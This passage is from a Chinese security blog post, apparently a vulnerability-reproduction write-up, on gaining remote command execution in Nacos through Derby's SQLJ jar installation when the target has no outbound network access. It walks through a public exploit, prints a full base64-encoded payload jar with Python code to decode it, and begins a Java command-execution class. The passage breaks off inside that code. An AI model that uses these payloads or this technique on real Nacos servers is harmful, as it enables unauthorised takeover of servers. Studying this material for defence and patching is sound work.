@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Nacos New RCE不出网利用方式前言7.15各个群里以及公众号都在传github上有网友公布了最新的nacos远程代码执行漏洞及exp。以及陆陆续续有大佬们复现了该漏洞。昨晚有师傅问我，不出网的方式怎么利用，我们今天来探讨一下不出网的方式。Nacos是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。 免责声明：文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nacos New RCE不出网利用方式">
+<meta property="og:url" content="https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="Nacos New RCE不出网利用方式前言7.15各个群里以及公众号都在传github上有网友公布了最新的nacos远程代码执行漏洞及exp。以及陆陆续续有大佬们复现了该漏洞。昨晚有师傅问我，不出网的方式怎么利用，我们今天来探讨一下不出网的方式。Nacos是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。 免责声明：文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/S7fZ4n2Mvo8CHlKf0nNjCoXzUQudE0EWXwUc_k4JOmA.png">
+<meta property="og:image" content="https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/A0tpy9zEuYAt_YWKn_9vhHGut96Ix0MCzVqcw3OlPlI.png">
+<meta property="og:image" content="https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/K_JBwfmUmb6rCU86QEfH_glIi2yKaYcgGMf-D-wssx0.png">
+<meta property="og:image" content="https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/ZQMIOh2U6iKr3PA93TRIaqiAmSKiIrGu2Q7beHXrm8E.png">
+<meta property="og:image" content="https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/v1viKwD3ATestcrrfygxNqY8Byblsd5CpYEiBjxgZ6A.png">
+<meta property="og:image" content="https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/jgVz_eqGWCP348kQY-ctbczS5iGdk5mE0uto6icEtB4.png">
+<meta property="og:image" content="https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/yFW4hdvkBfEZjxypQvhJNUXGCavFSV978zrEq71-rHw.png">
+<meta property="og:image" content="https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/6m78Djqj27UVQHVcWNTCOQ3SWDUvTKs9X_M5l-PhQgk.png">
+<meta property="article:published_time" content="2024-07-17T04:46:49.000Z">
+<meta property="article:modified_time" content="2026-04-01T12:14:59.926Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/S7fZ4n2Mvo8CHlKf0nNjCoXzUQudE0EWXwUc_k4JOmA.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Nacos New RCE不出网利用方式</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/04/19/kkFileView%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&text=Nacos New RCE不出网利用方式"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=Nacos New RCE不出网利用方式"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&is_video=false&description=Nacos New RCE不出网利用方式"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Nacos New RCE不出网利用方式&body=Check out this article: https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=Nacos New RCE不出网利用方式"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=Nacos New RCE不出网利用方式"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=Nacos New RCE不出网利用方式"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=Nacos New RCE不出网利用方式"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&name=Nacos New RCE不出网利用方式&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&t=Nacos New RCE不出网利用方式"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nacos-New-RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">Nacos New RCE不出网利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">EXP分析及利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">不出网利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.6.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.7.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Nacos New RCE不出网利用方式
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-17T04:46:49.000Z" class="dt-published" itemprop="datePublished">2024-07-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/RCE/" rel="tag">RCE</a>, <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Nacos-New-RCE不出网利用方式"><a href="#Nacos-New-RCE不出网利用方式" class="headerlink" title="Nacos New RCE不出网利用方式"></a>Nacos New RCE不出网利用方式</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>7.15各个群里以及公众号都在传github上有网友公布了最新的nacos远程代码执行漏洞及exp。以及陆陆续续有大佬们复现了该漏洞。昨晚有师傅问我，不出网的方式怎么利用，我们今天来探讨一下不出网的方式。Nacos是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。</p>
+<p><strong>免责声明：</strong>文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>Nacos某些版本存在远程代码执行漏洞，允许未经授权的代码执行，可能导致服务器被完全控制。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nacos <span class="number">2.3</span><span class="number">.2</span></span><br><span class="line">nacos <span class="number">2.4</span><span class="number">.0</span></span><br><span class="line">以及其它不确定的版本</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>需要有访问权限，但是默认的某些配置可能会是为授权访问的。</span><br><span class="line"><span class="number">2.</span>成因是Apache Derby数据库的SQLJ功能安装JAR包并创建自定义函数，从而在数据库环境中执行任意Java方法，最终达到执行系统命令。</span><br><span class="line">Derby数据库执行命令可参考：http:<span class="comment">//www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce</span></span><br></pre></td></tr></table></figure>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本次nacos实验环境：V2.3.2</p>
+<p>下载：<a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/releases">https://github.com/alibaba/nacos/releases</a></p>
+<p>启动命令：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh startup.sh -m standalone</span><br></pre></td></tr></table></figure>
+<p><img src="S7fZ4n2Mvo8CHlKf0nNjCoXzUQudE0EWXwUc_k4JOmA.png" alt="image"></p>
+<p><img src="A0tpy9zEuYAt_YWKn_9vhHGut96Ix0MCzVqcw3OlPlI.png" alt="image"></p>
+<h2 id="EXP分析及利用"><a href="#EXP分析及利用" class="headerlink" title="EXP分析及利用"></a>EXP分析及利用</h2><p>看了大佬公开的exp，service文件主要是一个payload</p>
+<p><img src="K_JBwfmUmb6rCU86QEfH_glIi2yKaYcgGMf-D-wssx0.png" alt="image"></p>
+<p>exploit.py文件：</p>
+<ol>
+<li>代码首先构造了几个关键的 SQL 语句，用于在数据库中安装 JAR 包、创建自定义函数以及执行命令。</li>
+<li>通过 HTTP POST 请求将 post_sql 发送到 removal_url。这一步安装了 JAR 包并创建了自定义函数。</li>
+<li>检查 POST 请求的响应，如果返回值中有 message 和 data 字段，则发送 GET 请求到 derby_url，执行包含命令的 SQL 语句并获取结果。</li>
+</ol>
+<p><img src="ZQMIOh2U6iKr3PA93TRIaqiAmSKiIrGu2Q7beHXrm8E.png" alt="image"></p>
+<p>试一下这个exp：先执行server.py，再执行exploit.py，这里演示执行命令：id</p>
+<p><img src="v1viKwD3ATestcrrfygxNqY8Byblsd5CpYEiBjxgZ6A.png" alt="image"></p>
+<h2 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a>不出网利用</h2><p>上面的exp是需要访问我5000端口的web服务下载payload的，如果目标不出网的话，我们应该如何利用呢。</p>
+<p>通过把payload进行解码后保存为jar解压查看其内容。这里使用一段简单的python代码进行处理。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;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&#x27;</span></span><br><span class="line">data = base64.b64decode(payload)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_jar</span>(<span class="params">byte_data, output_file</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 将字节数据写入文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(byte_data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;成功将字节数据写入文件: <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;写入文件失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定输出的文件路径</span></span><br><span class="line">output_file = <span class="string">&quot;output.jar&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数进行转换</span></span><br><span class="line">bytes_to_jar(data, output_file)</span><br></pre></td></tr></table></figure>
+<p>得到的 output.jar之后，解压查看里面的类</p>
+<p><img src="jgVz_eqGWCP348kQY-ctbczS5iGdk5mE0uto6icEtB4.png" alt="image"></p>
+<p>我们也可以自己依葫芦画瓢的写一段；先判断一下目标是Linux还是win来设置编码类型。保存为：Garck3h.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Garck3h</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> executeCommand(<span class="string">&quot;ipconfig&quot;</span>); <span class="comment">// 测试执行 ipconfig 命令</span></span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">executeCommand</span><span class="params">(String command)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">charset</span> <span class="operator">=</span> <span class="string">&quot;utf-8&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osName != <span class="literal">null</span> &amp;&amp; osName.startsWith(<span class="string">&quot;Windows&quot;</span>)) &#123;</span><br><span class="line">                charset = <span class="string">&quot;gbk&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream, charset);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">            String line;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            reader.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) 